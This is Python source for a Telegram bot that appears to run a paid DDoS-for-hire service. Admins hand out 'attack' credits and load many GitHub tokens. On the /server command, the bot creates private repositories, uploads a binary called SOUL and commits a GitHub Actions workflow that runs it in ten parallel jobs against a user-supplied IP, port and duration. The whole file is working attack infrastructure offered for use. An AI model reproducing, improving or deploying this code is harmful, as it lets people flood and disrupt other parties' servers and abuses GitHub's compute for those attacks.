import os
import asyncio
import base64
import json
import threading
from datetime import datetime
from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, ContextTypes
from github import Github, InputGitTreeElement, Auth
from flask import Flask

# Flask setup for Render port binding
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "✅ Flask server is running. Telegram bot is also running."

# Bot config
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")  # safer than hardcoding

ADMIN_IDS = {7163028849}
DATA_FILE = 'soul.json'
CREDIT_COST_PER_ATTACK = 25
REPO_NAME = "soulcrack90"

VBV_LOADING_FRAMES = [
    "🟦 [■□□□□]",
    "🟦 [■■□□□]",
    "🟦 [■■■□□]",
    "🟦 [■■■■□]",
    "🟦 [■■■■■]",
]

SOUL_YML_TEMPLATE = '''name: Run Soul 50x
on: [push]
jobs:
  soul:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
      - uses: actions/checkout@v3
      - name: Make binary executable
        run: chmod +x *
      - name: Run soul binary
        run: ./SOUL {ip} {port} {time} 900 -1
'''

user_sessions = {}
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        try:
            user_sessions = json.load(f)
            for session in user_sessions.values():
                if 'approved' in session and isinstance(session['approved'], list):
                    session['approved'] = set(session['approved'])
        except Exception:
            user_sessions = {}

def save_data():
    to_save = {}
    for k, v in user_sessions.items():
        copy_sess = v.copy()
        if 'approved' in copy_sess and isinstance(copy_sess['approved'], set):
            copy_sess['approved'] = list(copy_sess['approved'])
        to_save[k] = copy_sess
    with open(DATA_FILE, 'w') as f:
        json.dump(to_save, f)

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# === Telegram Bot Commands ===

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Show commands\n"
        "/approve <id> <credit>\n"
        "/credit <id> <credit>\n"
        "/remove <id>\n"
        "/token <token1> <token2> ...\n"
        "/server <ip> <port> <time>\n"
        "/status"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0: raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    session.setdefault('credits', {})
    session.setdefault('approved', set())
    session['credits'][id_] = credit
    session['approved'].add(id_)
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Approved ID {id_} with {credit} credits.")

async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /credit <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0: raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    if id_ not in session.get('credits', {}):
        await update.message.reply_text(f"ID {id_} is not yet approved.")
        return
    session['credits'][id_] += credit
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Added {credit} credits to ID {id_}.")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <id>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    session = user_sessions.get(chat_id, {})
    session.get('approved', set()).discard(id_)
    session.get('credits', {}).pop(id_, None)
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Removed ID {id_}.")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: /token <token1> <token2> ...")
        return
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    session['github_tokens'] = context.args
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Stored {len(context.args)} token(s).")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved = session.get('approved', set())
    credits = session.get('credits', {})
    if not approved:
        await update.message.reply_text("No approved IDs.")
        return
    lines = ["Approved IDs and credits:"]
    for id_ in approved:
        c = credits.get(id_, 0)
        lines.append(f"ID: {id_} — Credits: {c}")
    await update.message.reply_text("\n".join(lines))

async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved_ids = session.get('approved', set())
    credits = session.get('credits', {})
    github_tokens = session.get('github_tokens', [])
    if not github_tokens:
        await update.message.reply_text("No GitHub tokens set. Use /token")
        return
    if not approved_ids:
        await update.message.reply_text("No approved IDs.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /server <ip> <port> <time>")
        return
    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0: raise ValueError()
    except Exception:
        await update.message.reply_text("Time must be positive int")
        return
    if not os.path.isfile("SOUL"):
        await update.message.reply_text("Binary 'SOUL' not found.")
        return
    await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
    msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
    for i, frame in enumerate(VBV_LOADING_FRAMES):
        await asyncio.sleep(1)
        percent = int(((i+1)/len(VBV_LOADING_FRAMES))*100)
        try:
            await msg.edit_text(f"{frame}  {percent}% completed")
        except:
            pass
    tasks = []
    for id_ in list(approved_ids):
        credit = credits.get(id_, 0)
        if credit < CREDIT_COST_PER_ATTACK:
            await update.message.reply_text(f"ID {id_} lacks enough credit.")
            continue
        credits[id_] -= CREDIT_COST_PER_ATTACK
        for token in github_tokens:
            tasks.append(run_workflow_with_token_and_id(chat_id, token, ip, port, time_int, id_))
    user_sessions[chat_id]['credits'] = credits
    save_data()
    if tasks:
        await asyncio.gather(*tasks)
        await msg.edit_text("✅ Attack sent successfully.")
    else:
        await msg.edit_text("❌ No valid IDs to run the attack.")

async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, id_):
    try:
        os.system("chmod +x *")
        g = Github(auth=Auth.Token(github_token))
        user = g.get_user()
        repo = user.create_repo(REPO_NAME, private=True, auto_init=True)
        branch = repo.default_branch or "main"
        ref = repo.get_git_ref(f"heads/{branch}")
        commit = repo.get_git_commit(ref.object.sha)
        base_tree = repo.get_git_tree(commit.sha)
        with open("SOUL", "rb") as f:
            b64 = base64.b64encode(f.read()).decode('utf-8')
        blob = repo.create_git_blob(b64, "base64")
        binary = InputGitTreeElement("SOUL", "100755", "blob", sha=blob.sha)
        tree = repo.create_git_tree([binary], base_tree)
        commit = repo.create_git_commit("Add SOUL", tree, [commit])
        ref.edit(commit.sha)
        yml = SOUL_YML_TEMPLATE.format(ip=ip, port=port, time=time)
        yml_tree = repo.create_git_tree([
            InputGitTreeElement(".github/workflows/soul.yml", "100644", "blob", content=yml)
        ], tree)
        yml_commit = repo.create_git_commit("Add workflow", yml_tree, [commit])
        ref.edit(yml_commit.sha)
    except Exception as e:
        print(f"Error in workflow: {e}")

# === Main Entry ===

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host="0.0.0.0", port=port)

async def run_bot():
    telegram_app = Application.builder().token(TELEGRAM_TOKEN).build()
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("approve", approve))
    telegram_app.add_handler(CommandHandler("credit", add_credit))
    telegram_app.add_handler(CommandHandler("remove", remove))
    telegram_app.add_handler(CommandHandler("token", token))
    telegram_app.add_handler(CommandHandler("server", server))
    telegram_app.add_handler(CommandHandler("status", status))
    await telegram_app.run_polling()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    asyncio.run(run_bot())
